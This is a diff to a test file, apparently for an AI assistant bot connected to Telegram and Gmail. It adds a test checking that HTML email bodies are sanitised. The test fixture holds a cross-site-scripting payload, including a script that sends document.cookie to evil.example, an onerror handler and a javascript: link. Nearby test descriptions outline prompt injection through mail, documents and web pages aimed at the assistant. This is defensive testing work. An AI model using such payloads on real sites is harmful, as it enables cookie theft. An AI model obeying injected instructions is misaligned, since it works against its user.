@@ -98,7 +98,7 @@ function smokeTestTable_() {
     ['telegram 群組：只在 @bot / 回覆 bot / 指令時反應；/group on 群聊模式（成員共用 session、principal group_member：只能用放寬的 toolset、寫入送審、無記憶、MEMBER_SYSTEM_EXTRA、被擋附中性說明）、/group guest 訪客模式（獨立 session、無工具）、/group off；群組回覆 reply_to', testTelegramGroup_, 'pure'],
     // M7-A 安全
     ['principal: owner 不限、guest 全拒、group_member 只能用允許清單（memory / cronjob 不可放寬、approved 不能繞過）；工具清單同步過濾；principal 先於 RBAC；AuditLog 記 principal；W 送審不看策略', testPrincipalAccess_, 'pure'],
-    ['injection: 郵件 / 文件 / 網頁內藏指令，乖乖照做的模型 → X 類未執行（進審批）、config_set 不存在、設定未變、資料區塊標記完整（偽造 <<end>> 失效）；approval_policy=never 時評分會抓到外寄', testInjectionOwner_, 'pure'],
+    ['injection: 郵件 / 文件 / 網頁內藏指令，乖乖照做的模型 → X 類未執行（進審批）、config_set 不存在、設定未變、資料區塊標記完整（偽造 <<end>> 失效）、html_body 濾 script / iframe / on*；approval_policy=never 時評分會抓到外寄', testInjectionOwner_, 'pure'],
     ['injection: 群組成員 principal 下 Gmail / Drive / Calendar 讀取與 memory 寫入被拒、工具清單看不到、web_fetch 仍可用、AuditLog 記 group_member', testInjectionGroup_, 'pure'],
     ['secrets: 輪替 webhook secret（32 字元、重打 setWebhook、URL 遮 secret）；更換 token 先 getMe 驗證（格式錯 / 401 不寫）、成功才寫入並重登 webhook；AuditLog 不含 secret / token', testSecretRotation_, 'pure'],
     ['channels: telegram_member_toolsets 解析（預設 / 鎖定剔除 / 空 = 無）、儲存正規化、memberSystemExtra_ 列出清單、/group on 文字提到公開工具', testMemberToolsetsConfig_, 'pure'],
@@ -2739,6 +2739,12 @@ function testInjectionOwner_() {
   assert_(!broken.ok && broken.findings.some((f) => /\(c\)/.test(f.text)), '(c) 標記不完整被抓到');
   // registry 裡沒有能改設定的工具
   assert_(allToolDeclarations_().every((t) => !/config|rbac|approval|policy|setting/i.test(t.name)), 'registry 沒有設定類工具');
+  // html_body（6e10e03）：注入內容若被模型原樣塞進 HTML 信，script / iframe / form / on* / javascript: 都會被濾掉，文字保留
+  const dirty = '<p onclick="steal()">嗨</p><script>fetch("https://evil.example/x?c="+document.cookie)</script><iframe src="https://evil.example"></iframe>' +
+    '<form action="https://evil.example"><input name=pw></form><a href="javascript:alert(1)">連結</a><img src=x onerror=alert(1)><b>重點</b>';
+  const clean = gmailHtmlBody_(dirty);
+  assert_(!/<script|<iframe|<form|onclick|onerror|javascript:/i.test(clean) && /<p>嗨<\/p>/.test(clean) && /<b>重點<\/b>/.test(clean) && /<a>連結<\/a>/.test(clean), 'html_body 濾掉 script / iframe / form / on* / javascript:：' + clean);
+  assertEqual_([gmailHtmlBody_(''), gmailHtmlBody_(null), gmailHtmlBody_('<SCRIPT >x</SCRIPT>')], ['', '', ''], 'html_body 空值與大小寫');
 }
 
 function testInjectionGroup_() {
